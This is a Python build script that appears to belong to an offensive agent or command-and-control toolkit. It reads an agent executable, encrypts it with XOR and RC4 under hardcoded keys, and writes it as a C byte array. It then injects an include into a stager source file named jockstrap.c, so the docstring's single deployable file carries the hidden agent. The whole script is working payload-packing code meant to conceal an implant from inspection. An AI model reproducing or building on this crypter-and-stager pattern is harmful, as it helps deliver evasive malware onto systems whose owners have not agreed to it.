#!/usr/bin/env python3
r"""
build_staged_agent.py — embed an encrypted agent PE into jockstrap.c

Usage:
    python build_staged_agent.py out\jockey_agent.exe

Reads the raw agent PE, encrypts it, and writes:
  1. agent_blob.h  — C array embedded in jockstrap compilation
  2. (injects #include into jockstrap.c if not present)

The resulting jockstrap.exe is the ONLY file you need to deploy.
"""

import sys
import os
import struct

RC4_KEY = b"jky-runner-2026"
XOR_KEY = 0x5a


def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data))
    a = b = 0
    for k in range(len(data)):
        a = (a + 1) & 0xff
        b = (b + S[a]) & 0xff
        S[a], S[b] = S[b], S[a]
        out[k] = data[k] ^ S[(S[a] + S[b]) & 0xff]
    return bytes(out)


def encrypt(data: bytes) -> bytes:
    xored = bytearray(b ^ XOR_KEY for b in data)
    return rc4(bytes(xored), RC4_KEY)


def generate_blob_h(encrypted: bytes) -> str:
    """Generate agent_blob.h with the encrypted blob as a C array."""
    lines = [
        "/* AUTO-GENERATED — do not edit */",
        "#ifndef AGENT_BLOB_H",
        "#define AGENT_BLOB_H",
        "",
        "#include <stdint.h>",
        "",
        f"#define EMBEDDED_AGENT_LEN {len(encrypted)}",
        "",
        "static const uint8_t embedded_agent[] = {",
    ]

    for i in range(0, len(encrypted), 12):
        chunk = encrypted[i:i+12]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_str},")

    lines += [
        "};",
        "",
        "#endif /* AGENT_BLOB_H */",
        "",
    ]
    return "\n".join(lines)


def main():
    if len(sys.argv) < 2:
        print("usage: build_staged_agent.py <agent.exe>")
        sys.exit(1)

    src = sys.argv[1]
    if not os.path.exists(src):
        print(f"error: {src} not found")
        sys.exit(1)

    with open(src, "rb") as f:
        plain = f.read()

    enc = encrypt(plain)

    out_dir = os.path.dirname(os.path.abspath(__file__))

    # write agent_blob.h to include/ so the compiler finds it
    include_dir = os.path.join(out_dir, "include")
    os.makedirs(include_dir, exist_ok=True)
    blob_h = os.path.join(include_dir, "agent_blob.h")

    h_content = generate_blob_h(enc)
    with open(blob_h, "w") as f:
        f.write(h_content)

    print(f"agent blob: {len(plain)} bytes plain → {len(enc)} bytes encrypted")
    print(f"blob header: {blob_h}")

    # ensure jockstrap.c includes it
    jockstrap = os.path.join(out_dir, "src", "jockstrap.c")
    if os.path.exists(jockstrap):
        with open(jockstrap, "r") as f:
            content = f.read()
        if "agent_blob.h" not in content:
            content = content.replace(
                "#include <stdint.h>",
                "#include <stdint.h>\n#include \"agent_blob.h\""
            )
            with open(jockstrap, "w") as f:
                f.write(content)
            print(f"injected #include into jockstrap.c")


if __name__ == "__main__":
    main()
